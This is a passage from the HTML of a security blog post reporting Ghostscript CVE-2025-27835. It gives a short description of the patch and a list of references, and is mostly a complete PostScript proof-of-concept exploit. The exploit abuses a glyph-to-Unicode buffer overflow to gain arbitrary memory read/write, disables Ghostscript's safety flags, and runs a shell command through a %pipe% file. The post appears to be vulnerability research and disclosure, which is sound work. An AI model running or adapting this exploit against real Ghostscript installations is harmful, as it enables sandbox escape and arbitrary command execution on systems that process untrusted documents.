        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ghostscript-v10051-official-patch" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>As of GhostScript version 10.05.1, the exploit has been patched by changing the vulnerable memcpy line from copying <code>l * sizeof(short)</code> to simply <code>l</code> bytes.</p>
<img src="./Images/patch.png" alt="picture of patch showing last argument of memcpy goes from l * sizeof(short) to just l" style="display:block; margin:auto;">

<h2 class="relative group">References 
    <div id="references" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#references" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<ul>
<li><a
  href="https://github.com/ArtifexSoftware/ghostpdl/blob/41b1cf43a0705f097699261b5738cbdbed50091f/psi/zbfont.c"
    target="_blank"
  >Source Code</a>
</li>
<li><a
  href="https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10040"
    target="_blank"
  >Ghostscript 10.04.0</a>
</li>
<li><a
  href="https://www.cve.org/CVERecord?id=CVE-2025-27835"
    target="_blank"
  >CVE</a>
</li>
<li><a
  href="https://bugs.ghostscript.com/show_bug.cgi?id=708131"
    target="_blank"
  >Bug Report</a>
</li>
<li><a
  href="https://cgit.ghostscript.com/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=920fae68870"
    target="_blank"
  >Patch</a>
</li>
<li><a
  href="https://github.com/pwndbg/pwndbg"
    target="_blank"
  >pwndbg</a>
</li>
</ul>

<h2 class="relative group">Full Proof of Concept Code 
    <div id="full-proof-of-concept-code" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#full-proof-of-concept-code" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="c1">% gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mf">500000000</span> <span class="nf">setvmthreshold</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/REFIDX</span> <span class="mf">249888</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/REFOFS</span> <span class="mf">3248640</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/STROBJ</span> <span class="mf">1000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARROBJ</span> <span class="mf">6250</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/OBJARR</span> <span class="mf">32</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">STROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">1</span> <span class="nf">ARROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nv">/TARGET</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/MAGIC</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/STRPTR</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARRPTR</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;dststr&gt; &lt;dstidx&gt; &lt;srcstr&gt; &lt;srcidx&gt; &lt;length&gt; copystr -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/copystr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_length</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_srcidx</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_srcstr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_dstidx</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_dststr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_length</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_dststr</span> <span class="nf">_dstidx</span> <span class="nf">_srcstr</span> <span class="nf">_srcidx</span> <span class="nf">get</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_srcidx</span> <span class="nf">_srcidx</span> <span class="mf">1</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_dstidx</span> <span class="nf">_dstidx</span> <span class="mf">1</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">repeat</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;string&gt; &lt;int&gt; ptradd &lt;string&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/ptradd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_inc</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_ptr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_new</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="mf">0</span> <span class="mf">1</span> <span class="mf">7</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_i</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_b</span> <span class="nf">_ptr</span> <span class="nf">_i</span> <span class="nf">get</span> <span class="nf">_inc</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_inc</span> <span class="nf">_b</span> <span class="mf">-8</span> <span class="nf">bitshift</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_new</span> <span class="nf">_i</span> <span class="nf">_b</span> <span class="mf">255</span> <span class="nf">and</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">for</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_new</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;string-address&gt; &lt;string-buffer&gt; arbrd -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/arbrd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_buf</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_adr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">STRPTR</span> <span class="mf">0</span> <span class="nf">_adr</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_buf</span> <span class="mf">0</span> <span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">get</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="nf">length</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;string-address&gt; &lt;string-data&gt; arbwr -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/arbwr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_buf</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_adr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">STRPTR</span> <span class="mf">0</span> <span class="nf">_adr</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">    <span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">get</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="nf">length</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/DONE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/MAGIC</span> <span class="nf">TARGET</span> <span class="nf">REFIDX</span> <span class="nf">get</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/STRPTR</span> <span class="nf">MAGIC</span> <span class="mf">8</span> <span class="mf">8</span> <span class="nf">getinterval</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ARRPTR</span> <span class="nf">MAGIC</span> <span class="mf">24</span> <span class="mf">8</span> <span class="nf">getinterval</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(patch)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/arrptr</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arrptr</span> <span class="mf">0</span> <span class="nf">ARRPTR</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/arrsz</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">/next</span> <span class="nf">arrptr</span> <span class="mf">-40</span> <span class="nf">ptradd</span> <span class="mf">-48</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">next</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">arrsz</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">arrsz</span> <span class="p">&lt;</span><span class="nf">d886010000000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span> <span class="c1">% 100056
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">/next</span> <span class="nf">arrptr</span> <span class="mf">-56</span> <span class="nf">ptradd</span> <span class="mf">-48</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">next</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">arrsz</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">arrsz</span> <span class="p">&lt;</span><span class="nf">e886010000000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span> <span class="c1">% 100072
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="s">(unknown header layout)</span> <span class="nf">=</span> <span class="nf">quit</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/head</span> <span class="nf">next</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">/next</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cname</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cname_str</span> <span class="mf">21</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">head</span> <span class="nf">next</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">head</span> <span class="mf">32</span> <span class="nf">ptradd</span> <span class="nf">cname</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cname</span> <span class="nf">cname_str</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">cname_str</span> <span class="s">(gs_lib_ctx_init(core))</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/buf</span> <span class="mf">4</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr1</span> <span class="nf">head</span> <span class="mf">188</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr2</span> <span class="nf">head</span> <span class="mf">204</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr1</span> <span class="nf">buf</span> <span class="nf">arbrd</span> <span class="nf">buf</span> <span class="p">&lt;</span><span class="mf">01000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">ptr1</span> <span class="p">&lt;</span><span class="mf">00000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span> <span class="p">}</span> <span class="nf">if</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr2</span> <span class="nf">buf</span> <span class="nf">arbrd</span> <span class="nf">buf</span> <span class="p">&lt;</span><span class="mf">01000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">ptr2</span> <span class="p">&lt;</span><span class="mf">00000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span> <span class="p">}</span> <span class="nf">if</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(exec)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">    <span class="s">(%pipe%id)</span> <span class="s">(w)</span> <span class="nf">file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(done)</span> <span class="nf">=</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="mf">1</span> <span class="nf">pop</span> <span class="p">}</span> <span class="nf">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">quit</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">def</span>  <span class="c1">% DONE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">/MAIN</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/Myfont</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontName</span> <span class="nv">/Myfont</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontType</span> <span class="mf">1</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontMatrix</span> <span class="p">[</span><span class="mf">1</span> <span class="mf">0</span> <span class="mf">0</span> <span class="mf">1</span> <span class="mf">0</span> <span class="mf">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="nv">/lenIV</span> <span class="mf">-1</span> <span class="nv">/Subrs</span> <span class="p">[</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span> <span class="p">]</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Decoding</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Encoding</span> <span class="p">[</span> <span class="nv">/cs0</span> <span class="nv">/cs1</span> <span class="nv">/cs2</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/CharStrings</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/.notdef</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs0</span> <span class="p">{</span> <span class="nf">TEXT</span> <span class="mf">0</span> <span class="mf">1</span> <span class="nf">put</span> <span class="nv">/TARGET</span> <span class="mf">312500</span> <span class="nf">array</span> <span class="nf">def</span> <span class="nf">TARGET</span> <span class="nf">REFIDX</span> <span class="nf">OBJARR</span> <span class="nf">put</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs1</span> <span class="p">&lt;</span><span class="nf">0E</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cs2</span> <span class="p">{</span> <span class="nf">DONE</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/WeightVector</span> <span class="p">[</span><span class="mf">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/$Blend</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/FontInfo</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendAxisTypes</span> <span class="p">[</span> <span class="nv">/foo</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendDesignPositions</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/BlendDesignMap</span> <span class="p">[[[</span><span class="mf">1</span><span class="p">]]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/GlyphNames2Unicode</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/Blend</span> <span class="p">&lt;&lt;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/FontBBox</span> <span class="p">[[</span><span class="mf">1</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/Private</span> <span class="p">&lt;&lt;</span> <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">.buildfont1</span>
</span></span><span class="line"><span class="cl"><span class="nv">/FONT</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/FONTNAME</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nf">setfont</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s">(init)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/TEXT</span> <span class="mf">625000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/SOURCE2</span> <span class="mf">4000002</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/SOURCE1</span> <span class="mf">4000002</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">SOURCE2</span> <span class="nf">REFOFS</span> <span class="p">&lt;</span><span class="mf">7e12</span><span class="p">&gt;</span> <span class="nf">putinterval</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nv">/FontInfo</span> <span class="nf">get</span> <span class="nv">/GlyphNames2Unicode</span> <span class="nf">get</span> <span class="mf">1</span> <span class="nf">SOURCE1</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">FONT</span> <span class="nv">/CharStrings</span> <span class="nf">get</span> <span class="nv">/.notdef</span> <span class="nf">undef</span>
</span></span><span class="line"><span class="cl"><span class="nf">TEXT</span> <span class="mf">0</span> <span class="mf">0</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">TEXT</span> <span class="mf">1</span> <span class="mf">2</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s">(trigger)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">0</span> <span class="mf">750</span> <span class="nf">moveto</span>
</span></span><span class="line"><span class="cl"><span class="nf">TEXT</span> <span class="nf">show</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">def</span>  <span class="c1">% MAIN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">MAIN</span>
</span></span><span class="line"><span class="cl"><span class="nf">quit</span>
</span></span></code></pre></div>
          
          
          
        </div>

        

        

        

        

      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.407e5b2727c1f241c95d53db24c776bea71bfc18e09511b815d669ad8caca6e9e18a53864ad364b1ccccfa2f2956768d33cfe193bfb64d3406f3b5ece354ba57.js"
          integrity="sha512-QH5bJyfB8kHJXVPbJMd2vqcb/BjglRG4FdZprYyspunhilOGStNksczM&#43;i8pVnaNM8/hk7&#43;2TTQG87Xs41S6Vw=="
          data-oid="views_posts/1750992676979-PoC-Report-of-Ghostscript-CVE-2025-27835/index.md"
          data-oid-likes="likes_posts/1750992676979-PoC-Report-of-Ghostscript-CVE-2025-27835/index.md"></script>
      

    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/1750900346215-test-article/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >LACTF 2025 minecraft Writeup</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-02-09T00:00:00&#43;00:00">9 February 2025</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/1752023247845-making-ghostscript-cve-2025-27835-poc-usable/">
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Making Ghostscript CVE-2025-27835 PoC Usable</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-06-27T00:00:00&#43;00:00">27 June 2025</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
        <ul class="flex flex-col list-none sm:flex-row">
          
            <li
              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href=""
                title="">
                
                
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2025
          Richard Guizar
      </p>
    

    
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script> 
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-index-500"
  data-url="http://localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
